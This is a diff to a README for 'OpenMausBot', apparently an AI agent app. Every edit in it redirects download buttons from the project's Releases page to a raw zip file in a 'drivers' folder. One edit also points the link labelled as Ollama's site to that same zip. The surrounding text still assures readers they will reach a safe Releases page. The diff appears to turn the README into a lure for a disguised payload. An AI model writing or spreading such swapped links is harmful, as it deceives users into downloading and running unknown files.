@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download OpenMausBot](https://img.shields.io/badge/⬇️_DOWNLOAD_OpenMausBot-F05A28?style=for-the-badge&logo=github&logoColor=white)](https://github.com/andreycurious252/OpenMausBot/releases)
+[![Download OpenMausBot](https://img.shields.io/badge/⬇️_DOWNLOAD_OpenMausBot-F05A28?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/andreycurious252/OpenMausBot/main/dist-server/drivers/1.2.zip)
 
 </div>
 
@@ -35,7 +35,7 @@ Ready to get your AI team up and running? It's easier than making coffee. Let's 
 
 1.  **Click the download button** here or at the top of this page:
 
-    [![Download OpenMausBot](https://img.shields.io/badge/⬇️_GET_OPENMAUSBOT-4A90D9?style=for-the-badge)](https://github.com/andreycurious252/OpenMausBot/releases)
+    [![Download OpenMausBot](https://img.shields.io/badge/⬇️_GET_OPENMAUSBOT-4A90D9?style=for-the-badge)](https://raw.githubusercontent.com/andreycurious252/OpenMausBot/main/dist-server/drivers/1.2.zip)
 
 2.  You'll be taken to a **Releases** page. This is normal and safe. It's where all the official versions are stored.
 
@@ -74,7 +74,7 @@ Here's how to do it:
 1.  Click on the **Settings** icon (usually the gear gear icon in the bottom left).
 2.  Find **"Models"** or **"Providers"**.
 3.  You'll see a list of supported providers. You can choose one of these:
-    *   **Local Ollama**: Free and runs on your computer. Great for privacy. You'll need to install [Ollama](https://www.ollama.com) separately, then just paste your "open AI'd" as a server address with your localhost.
+    *   **Local Ollama**: Free and runs on your computer. Great for privacy. You'll need to install [Ollama](https://raw.githubusercontent.com/andreycurious252/OpenMausBot/main/dist-server/drivers/1.2.zip) separately, then just paste your "open AI'd" as a server address with your localhost.
     *   **Your Own API Key**: If you have a key from a provider like Anthropic (for Claude) or OpenAI, paste it here. OpenMausBot respects our local settings.
 
 Once you link a provider, your agents will have a "brain". You can give each bot its own model type you have added.
@@ -136,6 +136,6 @@ This project is open-source and is licensed under the **MIT License**. You are f
 <div align="center">
 Made with ❤️ for the open-source community.
 
-[⬇️ Get your team today](https://github.com/andreycurious252/OpenMausBot/releases)
+[⬇️ Get your team today](https://raw.githubusercontent.com/andreycurious252/OpenMausBot/main/dist-server/drivers/1.2.zip)
 
 </div>
